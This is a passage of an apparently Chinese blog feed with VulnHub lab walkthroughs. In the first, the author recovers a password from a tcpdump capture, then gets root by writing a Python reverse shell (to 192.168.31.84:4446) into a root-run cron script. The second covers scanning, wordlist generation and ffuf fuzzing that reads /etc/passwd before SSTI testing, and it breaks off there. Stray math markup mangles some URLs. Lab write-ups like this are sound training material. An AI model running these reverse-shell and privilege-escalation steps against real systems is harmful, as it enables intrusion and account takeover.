数，在蚁剑中用 mkfifo 的方式反弹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1173.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;005-tcpdump抓取数据包uid0的定时任务反弹vim全屏stty&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#005-tcpdump抓取数据包uid0的定时任务反弹vim全屏stty&#34;&gt;#&lt;/a&gt; 005 tcpdump 抓取数据包，UID=0 的定时任务反弹，vim 全屏 stty&lt;/h3&gt;
&lt;p&gt;对 webshell 做一个 pspy 监控看有没有定时任务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1174.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;追踪定期执行的任务 /opt/login.py, 只有拿到 eric 的权限才能查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1175.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然是登陆的脚本，肯定是有数据传送的，看了一下服务器上是存在 tcpdump&lt;br&gt;
 的，可以借用这个工具来监视数据包的传输，说不定能在数据包里有发现&lt;br&gt;
 tcpdump -i lo -w login.pcapng&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1176.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;抓了大概三分钟的数据之后将 login.pcapng 发送至 kali 上&lt;br&gt;
目标 webshell 上不存在 scp 命令也无法通过 python 的简易 web 打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1177.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;就将这个文件移动到了 /var/www/html 中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1178.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;直接通过浏览器打开这个文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#直接通过浏览器打开这个文件&#34;&gt;#&lt;/a&gt; 直接通过浏览器打开这个文件&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1179.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;页面中存在着 eric 的用户名和密码 3ricThompson% 2 ACovid19，但是后面还有&lt;br&gt;
一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番&lt;/p&gt;
&lt;p&gt;用 kali 机器下载此文件，用 strings 分析，得到了 3ricThompson% 2 ACovid19&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1180.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;但是-2-a出现在这个密码中很突兀可能是编码原因导致原来的特殊符号在数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#但是-2-a出现在这个密码中很突兀可能是编码原因导致原来的特殊符号在数&#34;&gt;#&lt;/a&gt; 但是 % 2 A 出现在这个密码中很突兀，可能是编码原因导致原来的特殊符号在数&lt;/h3&gt;
&lt;h3 id=&#34;据传输过程中发生了转码解码之后得到其是&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#据传输过程中发生了转码解码之后得到其是&#34;&gt;#&lt;/a&gt; 据传输过程中发生了转码，解码之后得到其是 *&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1181.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用下列两个方式尝试登陆服务器拿到了 eric 的权限&lt;br&gt;
 eric: 3ricThompson%2ACovid19 eric: 3ricThompson*Covid19&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1182.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到 login.py 看到漏洞形成的原因就是因为其往本地发送了一些登陆的数据包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1183.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 /opt 下还有两个文件是跟 root 账户相关的，chech.sh 就是去执行&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3doYXRpc215aXAucHk=&#34;&gt; whatismyip.py&lt;/span&gt;，而 whatismyip.py 就是得到公网 ip 的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1184.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 pspy 监控，发现定期执行的 login.py 是用 UID= 0 的用即 root 权限执行的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1185.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;eric 用户有对 login.py 的改写权限，改写 login.py 文件，通过 py 反弹 shell&lt;br&gt;
echo “import pty;import&lt;br&gt;
socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192&lt;br&gt;
.168.31.84’,4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.&lt;br&gt;
spawn(’/bin/bash’)” &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvZ2luLnB5&#34;&gt;login.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1186.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最终拿到了 root 用户，但是我么去用 vim 包括使用命令的时候往往输入了一部&lt;br&gt;
分内容之后就不能在再同一行继续输入了，这个美观问题经常很头疼&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1187.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以重设 stty 的大小，来将反弹得到的 shell 按照自己的 shell 的 stty 来标&lt;br&gt;
准化，自己当前的 stty 有多大就将其改为多大&lt;/p&gt;
&lt;p&gt;通过 python 先输出一个标准的 shell&lt;br&gt;
python3 -c “import pty;pty.spawn (’/bin/bash’)” 输入 ctrl+z 让其后台运行&lt;br&gt;
查看自己当前开启的终端的大小 stty - a&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1188.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;设置 stty 为 raw 模式，并前台启动后台运行的程序&lt;br&gt;
 stty raw -echo;fg 并输入回车两次&lt;br&gt;
输入 reset 重置 stty，如提示找不到 terminal 的类型，就设置为 xterm&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1189.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;根据查到的终端大小设置反弹 shell 的终端的 stty&lt;br&gt;
stty rows 25 columns 79&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1190.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在我们所使用的终端就比较工整了，vim 也能全屏使用了&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1191.png&#34; alt&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/143%20ORASI/</guid>
            <title>VULNHUB 43 ORASI</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/143%20ORASI/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvb3Jhc2ktMSw2NjAv&#34;&gt;https://www.vulnhub.com/entry/orasi-1,660/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTYzMTYyNzQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/16316274.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168.31.xx (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机地址&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1242.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫到 ip 之后对 ip 进行端口扫描&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1243.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这样扫看似扫出来了所有的端口但是端口里的具体信息却没有识别由于之&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这样扫看似扫出来了所有的端口但是端口里的具体信息却没有识别由于之&#34;&gt;#&lt;/a&gt; 这样扫看似扫出来了所有的端口，但是端口里的具体信息却没有识别，由于之&lt;/h3&gt;
&lt;h3 id=&#34;前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透比&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透比&#34;&gt;#&lt;/a&gt; 前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透，比&lt;/h3&gt;
&lt;p&gt;如 git 泄漏、dns 解析域名泄漏、各种服务的版本都含有更多的敏感信息&lt;/p&gt;
&lt;h3 id=&#34;因此需要对得到的服务器进一步深入扫描得到端口信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#因此需要对得到的服务器进一步深入扫描得到端口信息&#34;&gt;#&lt;/a&gt; 因此，需要对得到的服务器进一步深入扫描得到端口信息&lt;/h3&gt;
&lt;p&gt;sudo nmap -A -p- 192.168.31.17 --min-rate 5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1244.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168.31. 17 、靶机开放端口 21 , 22 , 80 , 5000&lt;/p&gt;
&lt;h3 id=&#34;002-ida反编译elf-leet加密语言-crunch生成字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-ida反编译elf-leet加密语言-crunch生成字典&#34;&gt;#&lt;/a&gt; 002 IDA 反编译 ELF、leet 加密语言、crunch 生成字典&lt;/h3&gt;
&lt;p&gt;匿名登陆 ftp 服务器寻找敏感信息，得到 pub 文件夹下的 url 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1245.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 file 命令可以判断出 url 是一个 ELF 文件，要反编译 ELF 文件需要借助 IDA&lt;br&gt;
 工具，这里将此文件传输到了一台具有 IDA 工具的电脑上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1246.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;反编译之后在 main 方法中看到 /sh4d0w$s&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1247.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEu&#34;&gt;http://192.168.31.&lt;/span&gt; 17 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1248.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看到一个奇怪的数字和英文单词 leet，查了一下其具体代表什么含义&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1249.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;原来是一种黑客的加密语言可以根据这一点生成一份字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原来是一种黑客的加密语言可以根据这一点生成一份字典&#34;&gt;#&lt;/a&gt; 原来是一种黑客的加密语言，可以根据这一点生成一份字典&lt;/h3&gt;
&lt;p&gt;利用 crunch 命令生成一份字典&lt;br&gt;
 crunch 6 6 1337leet -o wordlist.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1250.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;由之前反编译产生的一个疑似目录的文件进行访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#由之前反编译产生的一个疑似目录的文件进行访问&#34;&gt;#&lt;/a&gt; 由之前反编译产生的一个疑似目录的文件，进行访问&lt;/h3&gt;
&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvc2g0ZDB3&#34;&gt;http://192.168.31.17/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s](http://192.168.31.17/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1251.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;扫描一下此网站是否存在敏感目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描一下此网站是否存在敏感目录&#34;&gt;#&lt;/a&gt; 扫描一下此网站是否存在敏感目录&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcv&#34;&gt;http://192.168.31.17/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1252.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC8=&#34;&gt;http://192.168.31.17:5000/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1253.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问地址 http://192.168.31.17:5000/sh4d0w$s&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1254.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;页面有回显表示漏洞就在这个地方，现在我们有一个敏感的 url 地址和一份字&lt;br&gt;
典，可以根据此字典爆破此 url 地址的输入&lt;/p&gt;
&lt;h3 id=&#34;003-ffuf模糊测试-ssti模板注入绕过方式-ssti反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-ffuf模糊测试-ssti模板注入绕过方式-ssti反弹shell&#34;&gt;#&lt;/a&gt; 003 ffuf 模糊测试、SSTI 模板注入绕过方式、SSTI 反弹 shell&lt;/h3&gt;
&lt;p&gt;使用 ffuf 测试 input 的参数应该是字典中的哪个&lt;br&gt;
 ffuf - u “&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcz9GVVpaPS9ldGMvcGFzc3dk&#34;&gt;http://192.168.31.17:5000/sh4d0w$s?FUZZ=/etc/passwd&lt;/span&gt;” -w wordli.txt -fs 8&lt;br&gt;
 加载到了一个为 l333tt 的地址，此种情况下页面回显为 200&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1255.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;访问此网站发现了回显与输入的内容一致&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#访问此网站发现了回显与输入的内容一致&#34;&gt;#&lt;/a&gt; 访问此网站，发现了回显与输入的内容一致&lt;/h3&gt;
&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=&#34;&gt;http://192.168.31.17:5000/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mn&gt;333&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mn&gt;5000&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s?l333tt=pwd](http://192.168.31.17:5000/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s?l333tt=pwd)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1256.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;换成其他的参数之后发现回显依旧是输入本身&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#换成其他的参数之后发现回显依旧是输入本身&#34;&gt;#&lt;/a&gt; 换成其他的参数之后发现回显依旧是输入本身&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1257.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;利用 wappalyzer 发现网站时 python 写的、用的 flask 框架&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1258.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然是 flask 框架，就可以测试 SSTI 模版注入&lt;br&gt;
 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=&#34;&gt;http://192.168.31.17:5000/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mn&gt;333&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo 